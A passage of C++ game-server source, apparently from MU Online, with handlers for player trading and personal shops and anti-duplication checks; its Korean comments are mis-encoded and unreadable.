		GCServerMsgStringSend("ȯ����� �ȿ����� �ŷ��� �� �� �����ϴ�.", aIndex, 1);	// "ȯ����� �ȿ����� �ŷ��� �� �� �����ϴ�."
#endif
		return;
	}
#endif
	
	// �ŷ� �ɼ� üũ 
	if( (gObj[number].m_Option&OPTION_TRADE) != OPTION_TRADE )
	{
		GCTradeResponseSend(0x00, aIndex, gObj[number].Name);
		return;
	}
	
	// �ڽ��� ��û�ϰų� �ŷ��� �϶� �� �ŷ��� �̷�� ���� �ʵ���
	if( lpObj->m_IfState.use > 0 )
	{
		GCTradeResponseSend(0x03, aIndex, gObj[number].Name);
		return;
	}
	// ��밡 �ٸ����� �ϰ� �������� �ŷ��� �̷�� ���� �ʵ��� 
	if( gObj[number].m_IfState.use > 0 )
	{
		GCTradeResponseSend(0x02, aIndex, gObj[number].Name);
		return;
	}

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_20040719		// ������ ���� ���� - �ٸ� ������� �ŷ� ��û ��
	if (gObjFixInventoryPointer(aIndex) == false) {
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}
#endif

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_BUGFIX_20040825		// Ʈ������� �ɷ��ִ� ���¿��� �ٸ� ������� �ŷ� ��û�� �� �� ����.
	if (gObj[aIndex].pTransaction == 1) {
		LogAddTD("[%s][%s] CGTradeRequestSend() Failed : Transaction == 1, IF_TYPE : %d",
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			gObj[aIndex].m_IfState.type
			);
		return;
	}
#endif
	
	// �ŷ� ��û������ �����Ѵ�.
	lpObj->m_IfState.use         = 1;
	lpObj->m_IfState.state       = 0;
	lpObj->m_IfState.type        = I_TRADE;
	lpObj->TargetNumber	         = number;
	gObj[number].m_IfState.use   = 1;
	gObj[number].m_IfState.state = 0;
	gObj[number].m_IfState.type  = I_TRADE;
	gObj[number].TargetNumber	 = aIndex;
	lpObj->m_InterfaceTime       = GetTickCount();
	gObj[number].m_InterfaceTime = GetTickCount();

	PMSG_TRADE_REQUESTSEND	pMsg;	

	pMsg.h.c = PMHCE_BYTE;
	pMsg.h.headcode = 0x36;
	pMsg.h.size = sizeof( pMsg );

	memcpy(pMsg.szId, gObj[aIndex].Name, MAX_IDSTRING);

	DataSend(number, (LPBYTE)&pMsg, pMsg.h.size);
	LogAddTD(lMsg.Get(486), 
			gObj[aIndex].AccountID, 
			gObj[aIndex].Name,
			gObj[aIndex].Ip_addr,
			gObj[number].AccountID, 
			gObj[number].Name,
			gObj[number].Ip_addr);
}


//----------------------------------------------------------------------------
// [0x37] ���� ��ȯ�� ���� �� ���� �亯�� ����
void CGTradeResponseRecv(LPPMSG_TRADE_RESPONSE lpMsg, int aIndex)
{
	int Result=1;
	int number;
	
	number = gObj[aIndex].TargetNumber;

	if( !CHECK_LIMIT(aIndex, MAX_OBJECT) )
	{
		LogAdd("error-L1 : %d (A_ID:%s) %s %d",number, gObj[aIndex].AccountID, __FILE__, __LINE__);
		Result = 0;
		lpMsg->Response = 0x00;
	}

	if( !CHECK_LIMIT(number, MAX_OBJECT) )
	{	// ��� ��ȣ�� �������... �ŷ� ���¸� ��ҽ�Ų��.
		if(gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == I_TRADE )
		{
			gObj[aIndex].m_IfState.use = 0;
			gObj[aIndex].TargetNumber  = -1;
		}
		LogAdd("error-L1 : target:%d (A_ID:%s) %s %d",number, gObj[aIndex].AccountID, __FILE__, __LINE__);
		Result = 0;
		lpMsg->Response = 0x00;

#ifdef MODIFY_TARGETNUMBER_RECALLMON_INDEX_BUFGIX_20080711
		return;
#endif	// MODIFY_TARGETNUMBER_RECALLMON_INDEX_BUFGIX_20080711		
	}
	// ��밡 ���� ������ üũ
	if( gObjIsConnected(number) == FALSE ) 
	{	
		Result = 0;
		lpMsg->Response = 0x00;
	}	

	if( gObj[aIndex].CloseType != -1 )
	{
		Result = 0;
		lpMsg->Response = 0x00;
	}


#ifdef PERSONAL_SHOP_20040113		// �ڽ��̳� ������ ���λ����� �������̸� �ŷ��� �³� �� �� ����.
	if (gObj[aIndex].m_bPShopOpen == true) {
		Result = 0;
		lpMsg->Response = 0x00;
	}
	if (gObj[number].m_bPShopOpen == true) {
		Result = 0;
		lpMsg->Response = 0x00;
	}
#endif

	
	// �ŷ��ڿ� �ʹ� �ָ� ������ ������ �ȵȴ�.
	if( (gObj[aIndex].X < gObj[number].X-2) || (gObj[aIndex].X > gObj[number].X+2) || 
		(gObj[aIndex].Y < gObj[number].Y-2) || (gObj[aIndex].Y > gObj[number].Y+2))
	{
		Result = 0;
		lpMsg->Response = 0x00;
	}


	
	if( !gObj[aIndex].m_IfState.use || gObj[aIndex].m_IfState.type != I_TRADE ||
			gObj[aIndex].m_IfState.state != 0 )
	{		
		LogAddTD("(%s)(%s) Trade Interface State Error : use:%d type:%d",
				 gObj[aIndex].AccountID,
				 gObj[aIndex].Name,
				 gObj[aIndex].m_IfState.use,
				 gObj[aIndex].m_IfState.type);
		return;
	}

	if( !gObj[number].m_IfState.use || gObj[number].m_IfState.type != I_TRADE || 
		gObj[number].m_IfState.state != 0 )
	{		
		LogAddTD("(%s)(%s) Trade Interface State Error : use:%d type:%d",
				 gObj[number].AccountID,
				 gObj[number].Name,
				 gObj[number].m_IfState.use,
				 gObj[number].m_IfState.type);
		return;
	}	

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_20040719		// ������ ���� ���� - �ٸ� ������Լ� �ŷ� ��û�� ���� ��
	if (gObjFixInventoryPointer(aIndex) == false) {
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}
#endif

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_BUGFIX_20040825		// Ʈ������� �ɷ��ִ� ���¿��� �ٸ� ������Լ� �ŷ� ��û�� ���� �� ����.
	if (gObj[aIndex].pTransaction == 1) {
		LogAddTD("[%s][%s] CGTradeResponseRecv() Failed : Transaction == 1, IF_TYPE : %d",
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			gObj[aIndex].m_IfState.type
			);
		return;
	}
#endif
	
	// �Ѵ� ��ȯâ�� ����� 
	// �������� ��ȯ ����

	// ��Ҹ� �����ٸ� ��뿡�� ����� �˸���.
	if( lpMsg->Response == 0x00 )
	{
		GCTradeResponseSend(lpMsg->Response, number, gObj[aIndex].Name);
		Result = 0;
	}
	else {
		
		// ����� ������ �˸���		
#ifndef ITEMCOPY_BUGFIX_20040112
		GCTradeResponseSend(lpMsg->Response, number, gObj[aIndex].Name, gObj[aIndex].Level, gObj[aIndex].GuildNumber);		
		GCTradeResponseSend(lpMsg->Response, aIndex, gObj[number].Name, gObj[number].Level, gObj[number].GuildNumber);
#endif
		Result = 1;
		for( int n=0; n<MAX_TRADEITEM; n++)
		{
			gObj[aIndex].Trade[n].Clear();
			gObj[number].Trade[n].Clear();
		}
		memset(gObj[aIndex].TradeMap, 0xff, 4*8);
		memset(gObj[number].TradeMap, 0xff, 4*8);

		gObj[aIndex].m_IfState.state = 1;
		gObj[number].m_IfState.state = 1;
		gObj[aIndex].TradeMoney      = 0;
		gObj[number].TradeMoney      = 0;
#ifdef ITEMCOPY_BUGFIX_20040112
		if (gObjInventoryTrans(aIndex) == FALSE)
			Result = 2;
		if (gObjInventoryTrans(number) == FALSE)
			Result = 3;

		if (Result != 1) {	// �ʸ´´ٸ� ���� ��ҽ�Ŵ (�� �� OK �� �����̹Ƿ�)	P.S.> �⺻ ������ ��ȯ Ʈ������� �ʱ�ȭ ���� �����Ƿ� 
			lpMsg->Response = 0x00;		// ���¸� ��ҷ� ����
			GCTradeResponseSend(lpMsg->Response, number, gObj[aIndex].Name);
			GCTradeResponseSend(lpMsg->Response, aIndex, gObj[number].Name);

			if (Result == 2)
				LogAddTD("[%s][%s] Made Trade Error (in Transaction) [%s][%s]", gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[number].AccountID, gObj[number].Name);
			else if (Result == 3)
				LogAddTD("[%s][%s] Made Trade Error (in Transaction) [%s][%s]", gObj[number].AccountID, gObj[number].Name, gObj[aIndex].AccountID, gObj[aIndex].Name);
			Result = 0;
		}
		else {
			lpMsg->Response = 1;
			GCTradeResponseSend(lpMsg->Response, number, gObj[aIndex].Name, gObj[aIndex].Level, gObj[aIndex].GuildNumber);		
			GCTradeResponseSend(lpMsg->Response, aIndex, gObj[number].Name, gObj[number].Level, gObj[number].GuildNumber);

			LogAddTD("[%s][%s] Trade Ready [%s][%s]", gObj[number].AccountID, gObj[number].Name, gObj[aIndex].AccountID, gObj[aIndex].Name);
		}
#else
		gObjInventoryTrans(aIndex);
		gObjInventoryTrans(number);

		LogAddTD("[%s][%s] Trade Ready [%s][%s]", gObj[number].AccountID, gObj[number].Name, gObj[aIndex].AccountID, gObj[aIndex].Name);
#endif

	}
	
	// ����϶��� �Ѵ� ���¸� ���ش�.
	if( Result == 0 ) 
	{
		if( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == I_TRADE)
		{
			gObj[aIndex].m_IfState.use    = 0;
			gObj[aIndex].TargetNumber	  = -1;
			LogAddTD("Interface State : %d",gObj[aIndex].m_IfState.use);
		}
		
		// ��밡 �����ٸ�..
		if( gObj[number].TargetNumber == aIndex )
		{
			if( gObj[number].m_IfState.use && gObj[number].m_IfState.type == I_TRADE)
			{
				gObj[number].m_IfState.use = 0;
				gObj[number].TargetNumber  = -1;
				LogAddTD("Interface State : %d",gObj[number].m_IfState.use);
			}
		}
	}
}

//----------------------------------------------------------------------------
// [0x37] ���� ��ȯ�� ���� �������� ���� ���
BOOL GCTradeResponseSend(BYTE response, int aIndex, char* id, WORD level, int GuildNumber)
{
	PMSG_TRADE_RESPONSE	pMsg;
	
	PHeadSetB((LPBYTE)&pMsg, 0x37, sizeof( pMsg ));

	pMsg.Response = response;
	pMsg.Level = level;
	pMsg.GuildNumber = GuildNumber;
	memcpy(pMsg.Id, id, MAX_IDSTRING);

	return DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

//----------------------------------------------------------------------------
// [0x38] ������ ��ȯâ���� �������� ����
BOOL GCTradeOtherDel(int aIndex, BYTE tradeindex)
{
	PMSG_TRADE_OTHER_DEL pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x38, sizeof( pMsg ));

	pMsg.TradeItemIndex = tradeindex;
	return DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

//----------------------------------------------------------------------------
// [0x39] ������ ��ȯâ�� �������� �÷����Ҵ�.
#ifdef ITEM_INDEX_EXTEND_20050706
BOOL GCTradeOtherAdd(int aIndex, BYTE tradeindex, BYTE* iteminfo)
#else
BOOL GCTradeOtherAdd(int aIndex, BYTE tradeindex, BYTE iteminfo1, BYTE iteminfo2, BYTE iteminfo3, BYTE iteminfo4, BYTE iteminfo5)
#endif
{
	PMSG_TRADE_OTHER_MOVE	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x39, sizeof( pMsg ));

	pMsg.TradeItemIndex = tradeindex;

#ifdef MODIFY_ITEM_SOCKET_OPTION_BUGFIX_03_20080704
	pMsg.ItemInfo[0] = iteminfo[0];
	pMsg.ItemInfo[1] = iteminfo[1];
	pMsg.ItemInfo[2] = iteminfo[2];
	pMsg.ItemInfo[3] = iteminfo[3];
	pMsg.ItemInfo[4] = iteminfo[4];
	pMsg.ItemInfo[5] = iteminfo[5];
	pMsg.ItemInfo[6] = iteminfo[6];
	pMsg.ItemInfo[7] = iteminfo[7];
	pMsg.ItemInfo[8] = iteminfo[8];
	pMsg.ItemInfo[9] = iteminfo[9];
	pMsg.ItemInfo[10] = iteminfo[10];
	pMsg.ItemInfo[11] = iteminfo[11];
#else
	#ifdef ITEM_INDEX_EXTEND_20050706
	pMsg.ItemInfo[0] = iteminfo[0];
	pMsg.ItemInfo[1] = iteminfo[1];
	pMsg.ItemInfo[2] = iteminfo[2];
	pMsg.ItemInfo[3] = iteminfo[3];
	pMsg.ItemInfo[4] = iteminfo[4];
	pMsg.ItemInfo[5] = iteminfo[5];
	pMsg.ItemInfo[6] = iteminfo[6];
	#else
	pMsg.ItemInfo[0] = iteminfo1;
	pMsg.ItemInfo[1] = iteminfo2;
	pMsg.ItemInfo[2] = iteminfo3;
	pMsg.ItemInfo[3] = iteminfo4;
	#if ITEM_BUFFER_SIZE > 4
		pMsg.ItemInfo[4] = iteminfo5;
	#endif
	#endif
#endif // MODIFY_ITEM_SOCKET_OPTION_BUGFIX_03_20080704

	return DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

//----------------------------------------------------------------------------
// [0x3A] ���� ��ȯâ�� �߰�
void CGTradeMoneyRecv(LPPMSG_TRADE_GOLD lpMsg, int aIndex)
{
	PMSG_DEFRESULT pMsg;
	int money=0;

	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;

	if( !CHECK_LIMIT(aIndex, MAX_OBJECT) )
	{
		LogAdd("error : %s %d (%d)",__FILE__, __LINE__, aIndex);
		return ;
	}
	// �������̸�..
	if( gObj[aIndex].CloseType != -1 )
	{
		LogAdd(lMsg.Get(487), gObj[aIndex].AccountID, gObj[aIndex].Name);
		return;
	}

	int number = gObj[aIndex].TargetNumber;

	if( !CHECK_LIMIT(number, MAX_OBJECT) )
	{
		LogAdd(lMsg.Get(488), gObj[aIndex].AccountID, gObj[aIndex].Name, number);
		return;
	}
	
	// �������̸�..
	if( gObj[number].CloseType != -1 )
	{
		LogAdd(lMsg.Get(489), gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[number].AccountID, gObj[number].Name);
		return;
	}
	
	// �ŷ����� �ƴ϶��..  ���
	if( !gObj[aIndex].m_IfState.use && (gObj[aIndex].m_IfState.type != I_TRADE )) return;

	if( gObjCanItemTouch(&gObj[aIndex], I_TRADE) == FALSE )	// �������� �̵��� �� ���ٸ�
	{
		return;
	}

	// �ִ� �ŷ� �ݾ��� 50000000 �� ������ ����. 
	if( lpMsg->Money > 100000000 )
	{
		return;
	}
	
	money = lpMsg->Money;

	if( (int)gObj[aIndex].Money-money < 0 ) return;
	
	GCMoneySend(aIndex, gObj[aIndex].Money-money);

	PHeadSetB((LPBYTE)&pMsg, 0x3A, sizeof( pMsg ));

	pMsg.result     = 0x01;	
	
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

	if( number >= 0 )
	{
		gObj[aIndex].TradeMoney = money;
		gObj[aIndex].TradeOk = 0;
		gObj[number].TradeOk = 0;
		GCTradeOkButtonSend(number, 0x02);
		GCTradeOkButtonSend(aIndex, 0x00);
		GCTradeMoneyOther(number, gObj[aIndex].TradeMoney);
	}
}

//----------------------------------------------------------------------------
// [0x3B] ������ ��ȯâ�� ���� �־��ٰ� �˸���.
BOOL GCTradeMoneyOther(int aIndex, DWORD money)
{
	PMSG_TRADE_OTHER_GOLD	pMsg;
	
	PHeadSetB((LPBYTE)&pMsg, 0x3B, sizeof( pMsg ));

	pMsg.Money		= money;

	return DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

BOOL GCTradeOkButtonSend(int aIndex, BYTE flag)
{
	PMSG_TRADE_OKBUTTON		pMsg;
	
	PHeadSetB((LPBYTE)&pMsg, 0x3C, sizeof( pMsg ));
	pMsg.Flag       = flag;

	return DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size );
}

// 0x3C ���� ��ư�� �����ߴ�.. 
// 0x01 : 
void CGTradeOkButtonRecv(LPPMSG_TRADE_OKBUTTON lpMsg, int aIndex)
{
	int number;	
	
	number = gObj[aIndex].TargetNumber;
	if( number < 0 || number > MAX_OBJECT-1 ) return; 

	// ����ڰ� �ִ��� �˻�.
	if( gObjIsConnected(&gObj[number]) == FALSE ) return;	

	// ���� �ŷ� �� ����
	if( gObj[aIndex].m_IfState.use < 1 || gObj[aIndex].m_IfState.state != I_TRADE ) 
		return;
	
	// ��밡 �ŷ� �� ���� 
	if( gObj[number].m_IfState.use < 1 || gObj[number].m_IfState.state != I_TRADE ) 
		return;
	
	// �������̸�..
	if( gObj[aIndex].CloseType != -1 )
	{
		return;
	}
	if( gObj[number].CloseType != -1 )
	{
		return;
	}

	if( lpMsg->Flag == 0x01 )	// Ȯ��
	{	
		if( gObj[aIndex].TradeOk == 0 ) 
		{
			gObj[aIndex].TradeOk = 1;
			LogAddTD("[%s][%s] Trade Accept", gObj[aIndex].AccountID, gObj[aIndex].Name);
			GCTradeOkButtonSend(number, 0x01);
		}
	}
	else if( lpMsg->Flag == 0x00 ) // Ȯ�� ���
	{	
		if( gObj[aIndex].TradeOk == 1 ) 
		{
			GCTradeOkButtonSend(number, 0x00);
			gObj[aIndex].TradeOk = 0;
		}
	}
	gObjTradeOkButton(aIndex);
}

//----------------------------------------------------------------------------
// [0x3D] ��ȯ���� ������ ��� ��ư�� ������.
void CGTradeCancelButtonRecv(int aIndex)
{	
	int number = gObj[aIndex].TargetNumber;
	
	/*
	// ���� �������̸�..
	if( gObj[aIndex].CloseType != -1 )
	{
		return;
	}
	*/
	
	// ���� �ŷ� ���°� �ƴϴ�.
	/*
	if( gObj[aIndex].m_IfState.state != I_TRADE )
	{
		CGTradeResult(aIndex, 0x00);
		CGTradeResult(number, 0x00);
		return;
	}
	
	// ������ �ŷ� ���°� �ƴϴ�.
	if( gObj[number].m_IfState.state != I_TRADE )
	{
		CGTradeResult(aIndex, 0x00);
		CGTradeResult(number, 0x00);
		return;
	}
	*/
	
	gObjTradeCancel(aIndex);
	CGTradeResult(aIndex, 0x00);

	// ������ �����ϸ�.
	if( number >= 0 ) 
	{
		gObjTradeCancel(number);
		CGTradeResult(number, 0x00);
	}
}

//----------------------------------------------------------------------------
// [0x3D] ��ȯ���� ������ ��� ��ư�� ������.
void CGTradeResult(int aIndex, BYTE result)
{
	PMSG_TRADE_RESULT	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x3D, sizeof( pMsg ));
	pMsg.Result		= result;
	
	DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}


#ifdef PERSONAL_SHOP_20040113


//----------------------------------------------------------------------------
// CS [0x3F][0x01] ���λ��� �������� ���ݼ��� ��û
VOID CGPShopReqSetItemPrice (LPPMSG_REQ_PSHOP_SETITEMPRICE lpMsg, int aIndex)
{
	if (gDoPShopOpen == 0) {
		CGPShopAnsSetItemPrice (aIndex, 0, lpMsg->btItemPos);		// ��� 0
		return;
	}

	if (!gObjIsConnected(aIndex)) {
		LogAddTD("[PShop] ERROR : Index is not CONNECTED : %d", aIndex);
		return;
	}

	if (gObj[aIndex].Type != OBJTYPE_CHARACTER) {
		LogAddTD("[PShop] ERROR : Index is not CHARACTER : %d", aIndex);
		return;
	}

	if (gObj[aIndex].Level <= 5) {
		// ������ 5 �����̸� ���λ����� ������ �� ����.
		LogAddTD("[PShop] [%s][%s] ERROR : Level is Under 6 : %d", 
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			gObj[aIndex].Level
			);
		CGPShopAnsSetItemPrice (aIndex, 5, lpMsg->btItemPos);		// ��� 5 : ���λ��� �������� ������ 6 ����
		return;
	}
	
	if (!CHECK_LIMIT(lpMsg->btItemPos, MAX_INVENTORY_EXTEND)) {
		LogAddTD("[PShop] [%s][%s] ERROR : Item Position Out of Bound : %d", 
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			lpMsg->btItemPos
			);
		CGPShopAnsSetItemPrice (aIndex, 2, lpMsg->btItemPos);		// ��� 2 : ������ ��ġ�� �ε��� ������ ���
		return;
	}

	if( gObj[aIndex].Inventory1[lpMsg->btItemPos].IsItem() == FALSE ) 
	{
		LogAddTD("[PShop] [%s][%s] ERROR : Item Does Not Exist : %d", 
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			lpMsg->btItemPos
			);
		CGPShopAnsSetItemPrice (aIndex, 3, lpMsg->btItemPos);		// ��� 3 : �������� �������� ����
		return;
	}

	CItem * sitem = &gObj[aIndex].Inventory1[lpMsg->btItemPos];
	INT iItemPrice = MAKELONG (MAKEWORD(lpMsg->sItemPrice1,lpMsg->sItemPrice2), MAKEWORD(lpMsg->sItemPrice3,lpMsg->sItemPrice4));

#ifdef ANTIHACKING_SERIAL_0_ITEM_20051202	
	if( gObjCheckSerial0ItemList(sitem) )
	{
		// MODIFY_LOCALIZING_WTF_20060309 ���ö���¡ wtf ���� ������Ʈ 0.99.60 - 0.99.94
		MsgOutput( aIndex, lMsg.Get(3354) );			// "����� �� �����ϴ�. �����Ϳ� �����ϼ���."
#ifdef ADD_SHIELD_POINT_01_20060403
		GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
		GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
		LogAddTD("[ANTI-HACK][Serial 0 Item] [PShop] (%s)(%s) Item(%s) Pos(%d)", 
			gObj[aIndex].AccountID, gObj[aIndex].Name, sitem->GetName(), lpMsg->btItemPos);
		return;
	}
#endif
	
	// *> . ������� ������ �߿� ���� �������� ���� ������ Ȯ���Ѵ�.
#ifdef PERSONAL_SHOP_CHECK_COPYITEM_200406016
	if( gObjInventorySearchSerialNumber(&gObj[aIndex], sitem->GetNumber()) == FALSE )
	{
#ifdef ADD_SHIELD_POINT_01_20060403
		GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
		GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
		LogAdd("error-L2 : CopyItem [%s][%s] return %s %d", gObj[aIndex].AccountID, gObj[aIndex].Name, __FILE__, __LINE__);
		return;
	}
#endif
	
	if (iItemPrice <= 0) {
		LogAddTD("[PShop] [%s][%s] ERROR : Personal Shop Item Price <= 0 : %d", 
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			sitem->m_iPShopValue
			);
		CGPShopAnsSetItemPrice (aIndex, 4, lpMsg->btItemPos);			// ��� 4 : ������ ������ 0 �����̴�.
		return;
	}
	else {
		if( ((gObj[aIndex].Penalty&CTLCODE_ITEMDONTTOUCH) == CTLCODE_ITEMDONTTOUCH) ||
			((gObj[aIndex].Penalty&CTLCODE_ACCOUNTITEMBLOCK) == CTLCODE_ACCOUNTITEMBLOCK)
			)
		{
			LogAddTD("[PShop] [%s][%s] ERROR : Item Price Change - Item Block", 
				gObj[aIndex].AccountID,
				gObj[aIndex].Name,
				sitem->m_iPShopValue
				);

			CGPShopAnsSetItemPrice (aIndex, 6, lpMsg->btItemPos);		// ��� 6 : �����ۺ��̹Ƿ� �������� �Ұ�
			return;
		}
		else {
			// ������ �� ���� ����
			sitem->m_iPShopValue = iItemPrice;
			ItemAttribute[sitem->m_Type].Name[sizeof(ItemAttribute[sitem->m_Type].Name)-1] = 0;
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
			LogAddTD("[PShop] [%s][%s] Changing Item Price : %d (Type:%d (%s), Lev:%d, Serial:%u, Dur:%d", 
#else
			LogAddTD("[PShop] [%s][%s] Changing Item Price : %d (Type:%d (%s), Lev:%d, Serial:%d, Dur:%d", 
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
				gObj[aIndex].AccountID,
				gObj[aIndex].Name,
				sitem->m_iPShopValue,
				sitem->m_Type,
				ItemAttribute[sitem->m_Type].Name,
				sitem->m_Level,
				sitem->m_Number,
				sitem->m_Durability
				);

			CGPShopAnsSetItemPrice (aIndex, true, lpMsg->btItemPos);
		}
	}
	
}


//----------------------------------------------------------------------------
// SC [0x3F][0x01] ���λ��� �������� ���ݼ��� ���
VOID CGPShopAnsSetItemPrice (int aIndex, BYTE btResult, BYTE btItemPos)
{
	PMSG_ANS_PSHOP_SETITEMPRICE	pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x01, sizeof( pMsg ));
	pMsg.btResult	= btResult;
	pMsg.btItemPos	= btItemPos;
	
	DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}


//----------------------------------------------------------------------------
// CS [0x3F][0x02] ���λ��� ���� ��û
VOID CGPShopReqOpen (LPPMSG_REQ_PSHOP_OPEN lpMsg, int aIndex)
{
	if (gDoPShopOpen == 0) {
		return;
	}

	if (!gObjIsConnected(aIndex)) {
		LogAddTD("[PShop] ERROR : Index is not CONNECTED : %d", aIndex);
		return;
	}

	if (gObj[aIndex].Type != OBJTYPE_CHARACTER) {
		LogAddTD("[PShop] ERROR : Index is not CHARACTER : %d", aIndex);
		return;
	}

#ifdef ADD_NEWPVP_PKFIELD
	if ( g_NewPVP.IsDuel(gObj[aIndex]) )
	{
		// "�����߿��� ���λ����� �̿��� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3429), aIndex, 1);
		return;
	}

	if (g_NewPVP.IsObserver(gObj[aIndex]))
	{
		// "�����߿��� ���λ����� �̿��� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3430), aIndex, 1);
		return;
	}
#endif  // ADD_NEWPVP_PKFIELD
	
	if (gObj[aIndex].Level <= 5) {
		// ������ 5 �����̸� ���λ����� ������ �� ����.
		LogAddTD("[PShop] [%s][%s] ERROR : Level is Under 6 : %d", 
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			gObj[aIndex].Level
			);
		CGPShopAnsOpen (aIndex, 2);	// ��� 2 : ���λ��� �������� ������ 6 ����
		return;
	}

	if( ((gObj[aIndex].Penalty&CTLCODE_ITEMDONTTOUCH) == CTLCODE_ITEMDONTTOUCH) ||
		((gObj[aIndex].Penalty&CTLCODE_ACCOUNTITEMBLOCK) == CTLCODE_ACCOUNTITEMBLOCK)
		)
	{
		LogAddTD("[PShop] [%s][%s] ERROR : Cant't Open Shop - Item Block", 
			gObj[aIndex].AccountID,
			gObj[aIndex].Name
			);
		CGPShopAnsOpen (aIndex, 3);	// ��� 3 : ���λ��� �����ڰ� ������ ��ϰ���
		return;
	}

#ifdef CHAOSCASTLE_SYSTEM_20040408			// ī���� ĳ�� �ȿ����� ���λ����� ������ �� ����.
	if (CHECK_CHAOSCASTLE(gObj[aIndex].MapNumber)) {
		GCServerMsgStringSend(lMsg.Get(1221), aIndex, 1);	// "ī���� ĳ�� �ȿ����� ���λ����� �� �� �����ϴ�."
		CGPShopAnsOpen (aIndex, 0);
		return;
	}
#endif

	bool bEnablePShopOpen = false;

	if (gObj[aIndex].m_IfState.use == 0) {
		bEnablePShopOpen = true;
	}
	else if (gObj[aIndex].m_IfState.use == 1) {
		switch(gObj[aIndex].m_IfState.type) {
		case I_TRADE :				// ��ȯ ���� ��
			break;
		case I_PARTY :				// ��Ƽ ���� ��
			break;
		case I_SHOP :				// ���� �̿� ��
			break;
		case I_GUILD :				// ��� ���� ��
			break;
		case I_GUILDCREATE :		// ��� ���� ��
			break;
		case I_WAREHOUSE :			// â�� ��� ��
			break;
		case I_CHAOSBOX :			// ī�����ڽ� ��� ��
			break;
		case I_INVENTORY :			// �κ��丮 ��� ��
			bEnablePShopOpen = true;	// �κ��丮�� �� �� ���λ��� ��ư�� �����Ƿ�
			break;
		case I_EVENTCHIP :			// �̺�ƮĨ ��� ��
			break;
		case I_QUEST :				// ����Ʈ �������̽� ��
			break;
		case I_SERVERDIVISION :		// �������� ��
			break;
#ifdef DARKLORD_WORK
		case I_DARK_TRAINER :
			break;
#endif
		default:
			break;
		}

		if (bEnablePShopOpen == false) {
			LogAddTD("[PShop] [%s][%s] ERROR : m_IfState.type is Using : %d", 
				gObj[aIndex].AccountID,
				gObj[aIndex].Name,
				gObj[aIndex].m_IfState.type
				);
		}
	}
	else {
		// ���� �� �� ���� ����
		LogAddTD("[PShop] [%s][%s] ERROR : Unknown m_IfState.type : %d", 
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			gObj[aIndex].m_IfState.type
			);
		return;
	}

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_20040719		// ������ ���� ���� - ���λ��� ���� ��
	if (gObjFixInventoryPointer(aIndex) == false) {
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}
#endif

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_BUGFIX_20040825		// Ʈ������� �ɷ��ִ� ���¶�� ���λ����� ������ �� ����.
	if (gObj[aIndex].pTransaction == 1) {
		LogAddTD("[PShop] [%s][%s] ERROR : Transaction == 1, IF_TYPE : %d", 
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			gObj[aIndex].m_IfState.type
			);
		bEnablePShopOpen = false;
	}
#endif

	if (bEnablePShopOpen) {
		if (gObj[aIndex].m_bPShopOpen == false) {
			// ó�� ���������� �ϴ� ���̶��
//			gObj[aIndex].m_IfState.use = 1;
//			gObj[aIndex].m_IfState.state = 0;
//			gObj[aIndex].m_IfState.type = I_PSHOP_OPEN;		// �� ���� �κ��丮�� �ݵ�� ����� �ϹǷ� I_INVENTORY�� ���õǾ� ���� ���̴�.

			gObj[aIndex].m_bPShopOpen = true;
			memcpy (gObj[aIndex].m_szPShopText, lpMsg->szPShopText, MAX_PSHOP_TEXT);

			LogAddTD("[PShop] [%s][%s] Personal Shop Opened", 
				gObj[aIndex].AccountID,
				gObj[aIndex].Name
				);
		}
		else {
			// ���� �̸��� �����Ѵ�.
			memcpy (gObj[aIndex].m_szPShopText, lpMsg->szPShopText, MAX_PSHOP_TEXT);
			
			// �̹� ���������� �ϰ� �̸��� �ٲٴ� ���̶�� ���� ���� �ִ� ����鿡�� �˷��ش�.
			PMSG_ANS_PSHOP_TEXT_CHANGED pMsg;
			PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x10, sizeof( pMsg ));

			pMsg.NumberH = HIBYTE( aIndex );
